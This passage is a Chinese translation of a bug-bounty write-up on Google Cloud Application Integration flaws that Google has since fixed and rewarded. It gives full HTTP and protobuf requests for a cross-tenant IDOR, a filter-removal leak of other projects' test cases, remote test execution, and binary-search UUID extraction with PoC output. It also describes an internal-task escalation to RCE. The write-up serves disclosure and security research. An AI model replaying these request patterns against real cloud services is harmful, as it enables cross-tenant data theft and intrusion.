。奖励理由：这份报告质量极高！漏洞类别为“危害谷歌云生产环境”。漏洞无需攻击者与受害者之间有任何交互或关系。影响默认的谷歌云产品。  
  
### 第二回合（三个月后）  
  
你以为故事结束了？没那么简单。三个月后，我的模糊测试工具提醒我，在公开的 Application Integration 产品的 公共 API 中发现了一些 IDOR（不安全的直接对象引用）漏洞。  
  
原来，在整个 API 中，你可以在 URL 中引用自己的项目 ID，但同时引用别人的 UUID：  
```
GET /v1/projects/<你的项目>/locations/us-central1/integrations/anythinghere/versions/<受害者-uuid> HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <已移除>
```  
  
API 会愉快地返回受害者的资源，因为身份验证检查是针对你的项目 ID 进行的（你对自己的项目有授权），但**并没有访问控制检查**  
来确认该 ID 是否真的与你的项目相关联。  
  
然而，仅凭这一点影响不大，因为这些是 UUIDv4。搜索空间太大，无法通过暴力破解实现有效利用（搜索空间为 10^36）。因此，我开始寻找任何可能泄露受害者资源 UUID 的方法。  
  
就在这时，我注意到了这个有趣的“测试用例 (test cases)”功能。根据文档说明：  
> 使用 Application Integration，您可以在连接和管理 Google Cloud 服务及其他业务应用程序的复杂集成上创建和运行多个测试用例。通过测试您的集成流程，可以确保您的集成按预期工作。  
  
  
有趣的是，当你在前端查看测试用例如何加载时，浏览器会发送类似这样的请求：  
```
POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2Host: us-central1-integrations.clients6.google.comContent-Type: application/x-protobuf< 原始 Protocol Buffers (protobuf) 数据 >
```  
  
实际的请求负载是 protobuf 格式的，我在这里进行了解码，以便您能看到它的样子：  
```
{  "1": "projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4",  "2": "workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4",  "6": {    "1": ["name", "display_name", "update_time", "client_id"]  }}
```  
  
字段 1  
 是父资源（我的项目，我的版本 UUID），字段 6  
 是响应字段掩码，字段 2  
 (workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4  
) 似乎是某种过滤器。也许如果省略这个字段，它会返回所有工作流的测试用例？肯定不是吧……  
  
从请求中删除字段 2  
 和 6  
：  
```
{  "1": "projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4"}
```  
  
……响应返回了来自所有其他 GCP 项目的测试用例：  
```
{  "testCases": [    {      "name": "projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3",      "displayName": "test",      "triggerId": "api_trigger/AI_bebbia_CreateWOSubs_API_1",      "testInputParameters": [        {          "key": "InputData",          "dataType": "JSON_VALUE",          "defaultValue": {            "jsonValue": "{\n  \"OldSKU\": \"300465\",\n  \"orderid\": \"7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\",\n  ...\n}"          },          "displayName": "InputData"        }      ],      "creatorEmail": "redacted@google.com",      ...    }  ]}
```  
  
不过仔细看这个响应，你可能会注意到一些不对劲的地方。每个结果中的 versions/...  
 段都是 631a0566-02fc-4dce-b319-25e2c68168f4  
。那是我的  
版本 UUID，即我在字段 1  
 中发送的那个。API 只是将其原封不动地反映到每个测试用例的 name  
 字段中，即使这些测试用例属于不同项目中完全不同的集成。  
  
因此，虽然我现在拥有了所有 GCP 项目中每个测试用例的 ID，以及它们的集成名称和创建者邮箱，但我之前需要输入的、用于填充那些 IDOR 漏洞的**真实受害者版本 UUID**  
在响应中根本找不到。  
  
话虽如此，仅凭测试用例 ID 本身就已经可以造成一些真实的影响了。Application Integration 暴露了一个 :executeTest  
 端点，它根据 ID 运行测试用例，并且实际上**不需要**  
受害者的真实版本 UUID。  
  
**请求**  
```
POST /v1/projects/<你的项目>/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <已移除>Content-Length: 0
```  
  
**响应**  
```
{  "executionId": "5d49abed-7692-47aa-8660-5cdaea92d2af","outputParameters": {    "output": 3  },"assertionResults": [    {      "assertion": {        "assertionStrategy": "ASSERT_EQUALS",        "parameter": {          "key": "output",          "value": { "intValue": "3" }        }      },      "taskNumber": "1",      "taskName": "JsonnetMapperTask",      "status": "SUCCEEDED"    }  ],"testExecutionState": "PASSED"}
```  
  
所以我**已经可以触发任意测试用例**  
在任意受害者的环境中执行，但真正的目标仍然是能通过之前的 IDOR 访问受害者的整个集成，为此我需要**实际版本 UUID**  
。  
  
我在这里卡住了一会儿。直到我有了一个想法。filter  
 参数（字段 2  
）显然支持像 =  
 这样的比较操作符。如果它也支持 >  
 和 <=  
 呢？如果支持，我就可以锚定一个已知的测试用例 ID，然后对 workflow_id  
 字段进行二分查找，**一次一个十六进制字符**  
，直到重建出完整的 UUID：  
```
id = "<已知测试用例-uuid>" AND workflow_id > "<低值>" AND workflow_id <= "<高值>"
```  
  
每个请求都缩小了范围。如果测试用例仍然出现在响应中，则真实的 workflow_id  
 在 (低值, 高值]  
 区间内，否则就在区间外。理论上，一个 32 字符的十六进制 UUID 应该在大约128个请求后出现。  
  
我让 Claude 写了一个 PoC，它**一次就完美运行了**  
：  
```
$ python extract_by_id.py --token "<已移除>" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"Test case: 60413427-4d07-4c36-bce0-66cfcdd81879Parent:    projects/273897706296/locations/us-central1/integrations/x/versions/-Verified: target found. Starting binary search...  [ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)  [ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)  [12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)  [16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)  [20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)  [24/32] fb1dc5f3-0380-491c-af90-5a1400000000  (96 reqs)  [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000  (112 reqs)  [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56  (128 reqs)workflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56Total requests: 128
```  
  
我现在有了受害者的实际集成版本 UUID。将其与 GetIntegrationVersion  
 IDOR 结合起来：  
```
GET /v1/projects/<你的项目>/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <已移除>
```  
  
它返回了属于另一个项目的完整集成，包括每个触发器配置、任务配置、参数绑定和创建者邮箱：  
```
{  "name": "projects/<你的项目>/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56","state": "DRAFT","triggerConfigs": [    {      "label": "API Trigger",      "triggerType": "API",      "triggerId": "api_trigger/TestCasePOC5_API_1"    }  ],"taskConfigs": [    {      "task": "GenericRestV2Task",      "displayName": "Call REST Endpoint",      "parameters": {        "url": { "key": "url", "value": { "stringValue": "$url$" } },        "httpMethod": { "key": "httpMethod", "value": { "stringValue": "POST" } },        "authConfigName": { "key": "authConfigName", "value": { "stringValue": "authprofiletest" } }      }    }  ],  ..."integrationParameters": [    { "key": "url", "dataType": "STRING_VALUE", "defaultValue": { "stringValue": "https://example.com" } }  ],"lastModifierEmail": "gvrptest4@gmail.com","createTime": "2026-03-22T11:10:30.087Z"}
```  
  
如果你还记得最初的测试用例泄露，相当一部分那些 creatorEmail  
 字段以 @google.com  
 结尾。这意味着有很多**谷歌内部团队**  
在这个平台上运行他们自己的集成。我立刻想到：如果这些谷歌员工的集成中，有些已经配置了 GenericStubbyTypedTaskV2  
（或其他仅限内部的任务，如 PythonTask  
、CreateBuganizerIssueTask  
 等）呢？其中任何一个都可能将这个跨租户链升级到严重得多的问题。  
  
但我实际上无法检查。这样做意味着遍历真实的客户数据，这会违反谷歌 VRP 规则，所以我把我已有的所有信息打包，发送给了 Cloud VRP。  
### 配置内部任务类型  
  
这让我思考，到底是什么阻止了我创建自己的包含内部任务类型的集成？  
  
如果我尝试创建一个内部任务：  
```
POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <已移除>Content-Length: 1033{  "taskConfigsInternal": [    {      "taskNumber": "1",      "taskName": "PythonTask",      ...      "taskEntity": {        "uiConfig": {          "taskUiModuleConfigs": [            {              "moduleId": "RPC_TYPED"            }          ]        }      },      "taskType": "ASIS_TEMPLATE",      "parameters": {        "TEST": {          "key": "test",          "value": {            "stringValue": "test"          }        }      }    }  ],  ...}
```  
  
它**实际上会成功**  
：  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{"name": "projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a","origin": "UI","snapshotNumber": "1","updateTime": "2026-05-01T07:30:07.182512Z","lockHolder": "gvrptest4@gmail.com","createTime": "2026-05-01T07:30:07.182512Z","lastModifierEmail": "gvrptest4@gmail.com","state": "DRAFT",  ...}
```  
  
但当我尝试实际执行工作流时，它只会超时并显示以下错误：  
```
 Execution timeout, cancelled graph execution. The default timeout is 2min for sync execution and 10min for async execution. If you are using sync execution, please try async execution such as the Schedule API or Cloud Scheduler trigger. If you are already using async execution, please try to break down your integration into smaller pieces and chain them in the async way. Note any variable contains large data will also failed to upload to GCS. error/code: 'common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT'' 
```  
  
但是，我注意到了一些奇怪的现象。当我配置 PythonTask  
（内部任务之一），创建一个测试用例并执行该测试用例时，没有超时，而是在前端得到了这个可疑的错误：  
```
{  "1": 9,  "2": "java.io.IOException: No space left on device"}
```  
  
这是一个来自执行后台的真实异常，不是超时。无论测试用例功能运行的代码路径是什么，它都愉快地深入到足以在实际磁盘 I/O 上失败。对 GenericStubbyTypedTaskV2  
 尝试相同技巧时，我得到了一个信息量较少但同样可疑的响应：  
```
Failed to execute test case. Error: Unknown Error.
```  
  
我检查了工作流执行日志，这时显示了真正的错误：  
```
{ "message": "com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ", "code": 500 }
```  
  
这**非常可疑**  
。我肯定发现了什么。通过访问：  
```
GET /v1/projects/<项目>/locations/us-west1/integrations/ExampleTest1234:1/executions/id:downloadHost: integrations.googleapis.com
```  
  
可以拉取整个堆栈跟踪：  
```
com.google.enterprise.crm.exceptions.IpCanonicalCodeException: com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException: com.google.net.rpc3.client.RpcClientException: <eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/> APPLICATION_ERROR;enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;ServerTimeSec=0.00194812;LogBytes=256;FailFast;EffSecLevel=none;ReqFormat=uncompressed;ReqID=bea3d76b582d8a4;GlobalID=0;Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744) at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:725) at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654) at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475) at /java.base@25.0.1/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)  ...
```  
  
这表明我们的变量**被直接插入到后台的 ExecuteStubbyCallRequest 中**  
。根据对参数值进行实验得到的堆栈跟踪，我猜测后台代码大致如下：  
```
GenericStubbyTypedTaskV2.buildRequest():    line 219: setServerAddress(serverSpec)  → ExecuteStubbyCallRequest.java:1123    line 220: setServiceName(serviceName)   → ExecuteStubbyCallRequest.java:1219    line 221: setMethodName(serviceMethod)  → ExecuteStubbyCallRequest.java:1313    ...
```  
  
那么，也许需要我提供某个参数才能让它工作？问题是，堆栈跟踪只帮我泄露了三个已知参数 serverSpec  
、serviceName  
 和 serviceMethod  
，但我无法从这个方法中找到更多。此外，谷歌将这些 RCE 升级视为安全事件，所以在进一步行动之前，我询问了谷歌安全团队是否允许继续。他们很快就回复了我，确认这是可利用的，并让我停止进一步的测试。  
  
报告很快被升级为 **P0/S0**  
 并获得了🎉**Nice catch!**  
。大约一个月后，报告根据“危害谷歌云生产环境”类别被奖励 **75,000 美元**  
，这是我迄今为止获得的最高单笔赏金。  
  
根据我与一些谷歌员工的交流，我了解到在 Cloud VRP 表格 下，基本的 RCE 奖励大致分为三个等级：  
- **$50k**  
：相对无特权的生产用户访问权限  
  
- **$75k**  
：有特权的生产用户访问权限  
  
- **$100k**  
：谷歌云管理员权限  
  
一个给定的 RCE 实际属于哪个等级，完全取决于被入侵的生产身份能**直接访问**  
多少生产环境。显然，考虑到通过生产访问可接触到的广阔攻击面，很可能可以从任何类型的初始访问进行权限升级。  
  
谷歌在这里的推理出奇地含糊，但似乎内部团队自己对这条链条的调查发现了**比我所展示的更严重**  
的生产环境影响，这使其定位在 75,000 美元这个等级。  
### 时间线（第二次 RCE）  
- 2026-03-21 - 向谷歌发送初始报告  
  
- 2026-03-23 - 谷歌将报告分类为 P1/S1  
  
- 2026-03-23 - 通知谷歌安全团队关于 RCE 升级  
  
- 2026-03-23 - 🎉 **Nice catch!**  
，报告更新为 P0/S0  
  
- 2026-04-28 - **评审小组奖励 75,000 美元**  
。奖励理由：漏洞类别为“危害谷歌云生产环境”。漏洞无需攻击者与受害者之间有任何交互或关系。影响默认的谷歌云产品。  
  
- 2026-05-06 - 通知谷歌 GetIntegrationVersion RPC 仍然易受攻击  
  
- 2026-05-08 - **评审小组额外奖励 13,337 美元**  
。奖励理由：漏洞类别为“单一服务权限升级 - 写入 (WRITE)”。漏洞无需攻击者与受害者之间有任何交互或关系。影响默认的谷歌云产品。  
  
原文：https://brutecat.com/articles/google-cloud-rce/  
  
- END -  
  
**感谢阅读，如果觉得还不错的话，动动手指给个三连吧～**  
  
